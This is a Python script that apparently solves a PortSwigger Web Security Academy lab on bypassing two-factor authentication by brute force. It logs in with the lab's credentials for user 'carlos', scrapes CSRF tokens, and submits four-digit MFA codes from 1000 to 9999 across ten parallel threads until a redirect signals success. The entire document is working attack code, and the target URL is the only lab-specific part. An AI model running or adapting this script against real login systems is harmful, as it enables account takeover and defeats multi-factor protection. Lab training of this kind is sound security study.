#https://portswigger.net/academy/labs/launch/28468f8ce00fc3bd7c323d598659c718d294c4aa39e6a5e2b244b48b1116493e?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-bypass-using-a-brute-force-attack
import requests
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://0a0900db03ab6df7871d8d75004a00d7.web-security-academy.net"
login = url + "/login"
login2 = url + "/login2"

# Extract CSRF token using regex for speed
def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

# Handles login and returns a session with authenticated cookies
def re_login(session):
    response = session.get(login)
    csrf_token = csrf_fetch(response.text)
    login_payload = {
        "username": "carlos",
        "password": "montoya",
        "csrf": csrf_token
    }
    r = session.post(url=login, data=login_payload, allow_redirects=False)

# Attempts a single MFA code
def try_code(mfa_code):
    with requests.Session() as client:
        # Login phase
        re_login(client)

        # Go to MFA page
        login2_page = client.get(login2)

        # Fetch CSRF token for MFA step
        mfa_payload = {
            'csrf': csrf_fetch(login2_page.text),
            'mfa-code': mfa_code
        }

        # Submit MFA code
        mfa_response = client.post(login2, data=mfa_payload, allow_redirects=False)
        print(mfa_code, flush=True)
        print(mfa_response.status_code, flush=True)
        # If success (redirect), return the working code
        if mfa_response.status_code == 302:
            print(f"[SUCCESS] Correct MFA Code: {mfa_code}")
            return mfa_code
        return None

# Parallel brute force loop
if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(try_code, i): i for i in range(1000, 10000)}
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"Found the working MFA code: {result}")
                executor.shutdown(wait=False)
                break
